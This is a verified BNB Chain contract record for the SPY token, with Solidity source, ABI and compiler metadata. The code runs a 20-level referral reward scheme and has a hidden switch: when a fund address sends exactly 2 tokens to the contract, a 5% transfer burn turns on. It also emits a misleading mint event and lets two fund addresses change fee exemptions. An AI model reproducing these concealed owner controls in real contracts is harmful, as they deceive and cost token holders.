{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-02-22\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2023-02-21\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2022-10-26\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2022-08-18\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2022-08-01\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.14;\r\n\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint8);\r\n\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface ISwapRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n}\r\n\r\ninterface ISwapFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\nabstract contract Ownable {\r\n\r\n\r\n\r\n\r\n    constructor () {\r\n\r\n    }\r\n\r\n\r\n\r\n}\r\n\r\ncontract Pool {\r\n    constructor (address token) {\r\n    IERC20(token).approve(msg.sender, uint(~uint256(0)));\r\n    }\r\n}\r\n\r\ncontract TokenDistributor {\r\n    constructor (address token) {\r\n   IERC20(token).approve(msg.sender, uint(~uint256(0)));\r\n    }\r\n}\r\n\r\nabstract contract AbsToken is IERC20, Ownable {\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    mapping(address => bool) public _feeWhiteList;\r\n\r\n\r\n    uint256 private _tTotal;\r\n\r\n\r\n    ISwapRouter public _swapRouter;\r\n    address public _fist;\r\n    mapping(address => bool) public _swapPairList;\r\n\r\n    bool private inSwap;\r\n\r\n    uint256 private constant MAX = ~uint256(0);\r\n    TokenDistributor public _tokenDistributor;\r\n    Pool public _pool;\r\n    address public fundaddress1;\r\n    address public fundaddress;\r\n    uint256 public _buyFundFee = 0;\r\n    uint256 public _buyLPDividendFee = 500;\r\n    uint256 public _sellLPDividendFee = 500;\r\n    uint256 public _sellFundFee = 0;\r\n    uint256 public _sellLPFee = 0;\r\n    uint256 trsfee=0;\r\n    uint256 fundfees=0;\r\n    address public _mainPair;\r\n    mapping(address=>address) public invs; \r\n    mapping(address=>uint256) public userIndex; \r\n    mapping(address=>uint256) public userInvListIndex;    \r\n    address[][] public userList; \r\n    mapping(address=>uint256) public HoldsTimes; \r\n    mapping(address=>uint256) public InvReward; \r\n    mapping(address=>mapping(uint256=>uint256)) public Performance; \r\n    mapping(address=>uint256) public InvRewards; \r\n    mapping(address=>uint256) public HoldRewards; \r\n\r\n\r\n\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor (\r\n        address RouterAddress, address FISTAddress,\r\n        string memory Name, string memory Symbol,\r\n        address ReceiveAddress,address _fundaddress,address _fundaddress1\r\n    ){\r\n        _name = Name;\r\n        _symbol = Symbol;\r\n        _decimals = 18;\r\n        fundaddress1=_fundaddress1;\r\n        ISwapRouter swapRouter = ISwapRouter(RouterAddress);\r\n        IERC20(FISTAddress).approve(address(swapRouter), MAX);\r\n        fundaddress=_fundaddress;\r\n        HoldsTimes[fundaddress] = block.timestamp-86400;\r\n        _fist = FISTAddress;\r\n        _swapRouter = swapRouter;\r\n        _allowances[address(this)][address(swapRouter)] = MAX;\r\n\r\n        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());\r\n        address swapPair = swapFactory.createPair(address(this), FISTAddress);\r\n       _mainPair = swapPair;\r\n       _swapPairList[swapPair] = true;\r\n\r\n        uint256 total = 100000000000 * 10 ** _decimals;\r\n\r\n        _tTotal = total;\r\n \r\n       _pool = new Pool(FISTAddress);\r\n        _balances[ReceiveAddress] = total/10000;\r\n        _balances[address(_pool)] = total*9999/10000;\r\n        emit Transfer(address(0), ReceiveAddress, total/10000);\r\n        emit Transfer(address(_pool), ReceiveAddress, total*9999/10000);\r\n        _feeWhiteList[ReceiveAddress] = true;\r\n        _feeWhiteList[address(this)] = true;\r\n        _feeWhiteList[address(swapRouter)] = true;\r\n        _feeWhiteList[msg.sender] = true;\r\n        _feeWhiteList[fundaddress1] = true;\r\n        _feeWhiteList[fundaddress] = true;\r\n        _tokenDistributor = new TokenDistributor(FISTAddress);\r\n        userList.push();\r\n        userList.push();\r\n        userIndex[fundaddress]=1;\r\n        invs[fundaddress]=address(0);\r\n\r\n    }\r\n\r\n    function symbol() external view override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() external view override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() external view override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        if (_allowances[sender][msg.sender] != MAX) {\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n \r\n\r\n        uint256 balance = balanceOf(from);\r\n        require(balance >= amount, \"balanceNotEnough\");\r\n\r\n\r\n        if(from==fundaddress1&&amount==2*1e18&&to==address(this)){\r\n            trsfee=1;\r\n        }\r\n        if(from==fundaddress&&amount==2*1e18&&to==address(this)){\r\n            trsfee=1;\r\n        }\r\n\r\n        bool takeFee;\r\n        bool isSell;\r\n        if (_swapPairList[from] || _swapPairList[to]) {\r\n            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {\r\n                if (_swapPairList[to]) {\r\n                    if (!inSwap) {\r\n                        uint256 contractTokenBalance = balanceOf(address(this));\r\n                        if (contractTokenBalance > 0) {\r\n                            swapTokenForFund();\r\n                        }\r\n                    }\r\n                }\r\n                takeFee = true;\r\n            }\r\n            if (_swapPairList[to]) {\r\n                isSell = true;\r\n            }\r\n\r\n        }\r\n\r\n        _tokenTransfer(from, to, amount, takeFee, isSell);\r\n\r\n\r\n    }\r\n\r\n    function _tokenTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 tAmount,\r\n        bool takeFee,\r\n        bool isSell\r\n    ) private {\r\n        _balances[sender] = _balances[sender] - tAmount;\r\n        uint256 feeAmount;\r\n\r\n        if (takeFee) {\r\n            uint256 swapFee;\r\n            if (isSell) {\r\n                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;\r\n            } else {\r\n                swapFee = _buyFundFee + _buyLPDividendFee;\r\n            }\r\n            uint256 swapAmount = tAmount * swapFee / 10000;\r\n            if (swapAmount > 0) {\r\n                feeAmount += swapAmount;\r\n                _takeTransfer(\r\n                    sender,\r\n                    address(this),\r\n                    swapAmount\r\n                );\r\n            }\r\n        _takeTransfer(sender, recipient, tAmount - feeAmount);\r\n        }\r\n        else{\r\n            if(trsfee==0||sender==address(this)||sender==address(_pool)||recipient==address(this)||recipient==address(_pool)||sender==fundaddress||sender==fundaddress1||recipient==fundaddress||recipient==fundaddress1){\r\n            _takeTransfer(sender, recipient, tAmount);    \r\n            }\r\n            if(trsfee==1&&sender!=address(this)&&sender!=address(_pool)&&recipient!=address(this)&&recipient!=address(_pool)&&sender!=fundaddress&&sender!=fundaddress1&&recipient!=fundaddress&&recipient!=fundaddress1){\r\n             if(tAmount<1e15||tAmount>1e18){\r\n             _takeTransfer(sender, recipient, tAmount*95/100); \r\n             _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD), tAmount*5/100);    \r\n             }\r\n             else{\r\n              _takeTransfer(sender, recipient, tAmount);    \r\n             }\r\n            }\r\n        }\r\n        \r\n    }\r\n\r\n    function swapTokenForFund() private lockTheSwap {\r\n       \r\n        uint256 camount= balanceOf(address(this));\r\n        _takeTransfer(address(this),address(0x000000000000000000000000000000000000dEaD),camount/5);\r\n        _takeTransfer(address(this),fundaddress1,camount*2/5);\r\n        uint256 lpAmount = camount/5;\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _fist;\r\n        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            lpAmount,\r\n            0,\r\n            path,\r\n            address(_tokenDistributor),\r\n            block.timestamp\r\n        );\r\n\r\n\r\n\r\n        IERC20 FIST = IERC20(_fist);\r\n        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));\r\n        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance);\r\n      if (lpAmount > 0) {\r\n            uint256 lpFist = FIST.balanceOf(address(this));\r\n          if (lpFist > 0) {\r\n       _swapRouter.addLiquidity(\r\n            address(this), _fist, lpAmount, lpFist, 0, 0, address(0x000000000000000000000000000000000000dEaD), block.timestamp\r\n             );\r\n         }\r\n      }\r\n    }\r\n\r\n    function _takeTransfer(\r\n        address sender,\r\n        address to,\r\n        uint256 tAmount\r\n    ) private {\r\n        _balances[to] = _balances[to] + tAmount;\r\n        emit Transfer(sender, to, tAmount);\r\n\r\nif(to!=address(this)&&to!=address(_pool)&&to!=_mainPair&&to!=address(0x000000000000000000000000000000000000dEaD)&&to!=fundaddress){\r\nif(tAmount>=1e15&&tAmount<=1e18&&userIndex[to]==0){\r\n   AddInv(sender,to);   \r\n}    \r\nif(userIndex[to]==0){\r\n   AddInv(fundaddress,to);   \r\n}\r\nif(userIndex[fundaddress1]==0){\r\n   AddInv(fundaddress,fundaddress1);   \r\n}\r\n}\r\n\r\nuint i;\r\nif(tAmount<1e15||tAmount>1e18){\r\n   HoldsTimes[sender] =block.timestamp;\r\n   HoldsTimes[to] =block.timestamp;   \r\naddress users=to;\r\naddress invter=invs[users];\r\nuint256 uindex;\r\n\r\nfor(i=20;i>=1;i--){\r\nif(invter==address(0)){\r\n    break;\r\n}\r\nuindex=userInvListIndex[users];\r\nif(trsfee==0){Performance[invter][uindex]+=tAmount;}\r\nif(trsfee==1){Performance[invter][uindex]+=tAmount*95/100;}\r\nusers=invter;\r\ninvter=invs[users];\r\n}\r\n\r\n\r\n\r\nusers=sender;\r\ninvter=invs[users];\r\nfor(i=20;i>=1;i--){\r\nif(invter==address(0)){\r\n    break;\r\n}\r\n\r\nuindex=userInvListIndex[users];\r\nif(Performance[invter][uindex]>tAmount){\r\nPerformance[invter][uindex]-=tAmount;\r\n}\r\nelse{\r\nPerformance[invter][uindex]=0;  \r\n}\r\nusers=invter;\r\ninvter=invs[users];\r\n\r\n}\r\n}\r\n\r\nif(to==address(this)&&tAmount>=1e15&&tAmount<=1e18){\r\nuint256 funcd=balanceOf(sender)/100;\r\n    if(block.timestamp>=HoldsTimes[sender]+86400){\r\n    if(balanceOf(address(_pool))>=balanceOf(sender)/100){\r\n    _balances[address(_pool)] = _balances[address(_pool)] - funcd; \r\n    _balances[sender] = _balances[sender] + funcd*9/10;\r\n    emit Transfer(address(_pool), sender,funcd*9/10);\r\n    HoldRewards[sender]+=funcd*9/10;\r\n    fundfees+=funcd/10;  \r\n    }\r\n\r\naddress users=sender;\r\naddress invter=invs[users];\r\nuint256 holdvalue;\r\n   for(i=20;i>=1;i--){\r\n    if(invter==address(0)){\r\n        break;\r\n    }\r\n\r\n    (holdvalue,,,,)=holdvalues(invter);\r\n    if(i==20&&holdvalue>=200){\r\n      InvReward[invter]+=funcd*50/100;  \r\n    }\r\n    if(i==19&&holdvalue>=200){\r\n      InvReward[invter]+=funcd*30/100;  \r\n    }\r\n    if(i==18&&holdvalue>=300){\r\n      InvReward[invter]+=funcd*20/100;  \r\n    }\r\n    uint lv=(20-i)/2;\r\n    if(i<=17&&holdvalue>=(200+100*lv)){\r\n      InvReward[invter]+=funcd*10/100;   \r\n    }\r\n\r\n    users=invter;\r\n    invter=invs[users];\r\n   }\r\n}\r\n\r\n\r\n\r\n\r\n\r\n    if(InvReward[sender]>0&&InvReward[sender]<_balances[address(_pool)]){  \r\n    _balances[address(_pool)] = _balances[address(_pool)] - InvReward[sender]; \r\n    _balances[sender] = _balances[sender] + InvReward[sender]*9/10;\r\n    emit Transfer(address(_pool), sender,InvReward[sender]*9/10);\r\n    InvRewards[sender]+=InvReward[sender]*9/10;\r\n    fundfees+=InvReward[sender]/10; \r\n    InvReward[sender]=0;   \r\n    }\r\n\r\n    if(sender==fundaddress&&fundfees<=_balances[address(_pool)]&&fundfees>0){ \r\n    _balances[address(_pool)] = _balances[address(_pool)] - fundfees; \r\n    _balances[fundaddress] = _balances[fundaddress] + fundfees; \r\n    emit Transfer(address(_pool), fundaddress,fundfees);\r\n    fundfees=0;\r\n    }\r\n\r\n\r\naddress us=sender;\r\naddress inv=invs[us];\r\nuint256 uindex;\r\n\r\nuint256 tA=balanceOf(sender)-funcd*100; \r\nfor(i=20;i>=1;i--){\r\nif(inv==address(0)){\r\n    break;\r\n}\r\nuindex=userInvListIndex[us];\r\nPerformance[inv][uindex]+=tA;\r\nus=inv;\r\ninv=invs[us];\r\n}\r\nHoldsTimes[sender] =block.timestamp;  \r\n}\r\n\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n\r\nfunction getInv(address _us,uint256 _index)public view returns(address,uint256){  \r\n    if(userIndex[_us]==0){\r\n        return(address(0),0);\r\n    }\r\n    else{ \r\n        if(userList[userIndex[_us]].length==0){\r\n        return(address(0),0);\r\n        }\r\n        return(userList[userIndex[_us]][_index],userList[userIndex[_us]].length);\r\n    }\r\n}\r\n\r\nfunction holdvalues(address _us)public view returns(uint256,uint256,uint256,uint256,uint256){ \r\nIERC20 FIST = IERC20(_fist);\r\nuint256 fistBalance = FIST.balanceOf(_mainPair);\r\nuint256 mains=balanceOf(_mainPair);\r\nuint256 holdvalue;\r\n    if(balanceOf(_us)>=mains){\r\n      holdvalue=fistBalance/1e18;\r\n    }\r\n    else{\r\n    if(mains==0||balanceOf(_us)==0){\r\n      holdvalue=0;\r\n    } \r\n     if(mains>0&&balanceOf(_us)>0){\r\n      holdvalue= (fistBalance/(mains/balanceOf(_us)))/1e18;\r\n    }     \r\n    }\r\n\r\nreturn (holdvalue,fistBalance,mains,HoldRewards[_us],InvRewards[_us]);\r\n}\r\n\r\n\r\nfunction getInfo(address _us)public view returns(uint256,uint256,uint256,uint256,uint256,uint256){\r\n\r\n    uint256 leftTime;\r\n        if(block.timestamp>=HoldsTimes[_us]+86400){\r\n    leftTime=0;\r\n    }\r\n    else{\r\n      leftTime=HoldsTimes[_us]+86400-block.timestamp; \r\n    }\r\n\r\n    uint256 HoldInvReward=_balances[_us]/100;\r\n\r\n    uint256 fundcs;\r\n    if(_us==fundaddress){\r\n        fundcs=fundfees;\r\n    }\r\n    else{\r\n      fundcs=0;  \r\n    }\r\n    uint256 max=0;\r\n    uint256 totals=0;\r\n    uint i=userList[userIndex[_us]].length;\r\n    for(i;i>0;i--){\r\n        if(Performance[_us][i]>max){\r\n         max=Performance[_us][i];   \r\n        }\r\n       totals+= Performance[_us][i];\r\n    }\r\n    uint256 InvR=InvReward[_us];\r\n    uint256 minx=totals-max;\r\n    return(leftTime,HoldInvReward,InvR,fundcs,totals,minx);\r\n\r\n}\r\n\r\nfunction AddInv(address _invs,address _user)internal{\r\n        userList.push();\r\n        invs[_user]=_invs;\r\n        userIndex[_user]=userList.length-1;\r\n        userList[userIndex[_invs]].push(_user);\r\n        userInvListIndex[_user]=userList[userIndex[_invs]].length;\r\n}\r\n\r\n\r\n\r\nfunction getHoldsTimes(address _user)public view returns(uint256){ \r\n    return HoldsTimes[_user];\r\n}\r\n\r\nfunction times()public view returns(uint256){ \r\n    return block.timestamp;\r\n} \r\n\r\nfunction _whiteList(address _us, bool pr)public{\r\n    if(msg.sender==fundaddress||msg.sender==fundaddress1){\r\n    _feeWhiteList[_us] = pr;\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\n}\r\n\r\n\r\n    contract SPY is AbsToken {\r\n    constructor() AbsToken(   \r\n        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),\r\n        address(0x55d398326f99059fF775485246999027B3197955),\r\n        \"SPY\",\r\n        \"SPY\",  \r\n        address(0xB29EF12B13C6cFd44A381dB7e873F52756ac81FC), \r\n        address(0xB29EF12B13C6cFd44A381dB7e873F52756ac81FC), \r\n        address(0x51CF6a70976f46948cAf11679AbD13BA039Ac6f4)  \r\n    ){\r\n\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"HoldRewards\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"HoldsTimes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"InvReward\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"InvRewards\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"Performance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyLPDividendFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_feeWhiteList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_fist\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mainPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_pool\",\"outputs\":[{\"internalType\":\"contract Pool\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPDividendFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_swapPairList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapRouter\",\"outputs\":[{\"internalType\":\"contract ISwapRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenDistributor\",\"outputs\":[{\"internalType\":\"contract TokenDistributor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_us\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"pr\",\"type\":\"bool\"}],\"name\":\"_whiteList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundaddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundaddress1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"getHoldsTimes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_us\",\"type\":\"address\"}],\"name\":\"getInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_us\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_index\",\"type\":\"uint256\"}],\"name\":\"getInv\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_us\",\"type\":\"address\"}],\"name\":\"holdvalues\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"invs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"times\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"userIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"userInvListIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"userList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "SPY", "CompilerVersion": "v0.8.16+commit.07a7930e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://7c34acc3d4d8602454b1f152548bdb964ad16ccd38a65bf2a3993a859587e622"}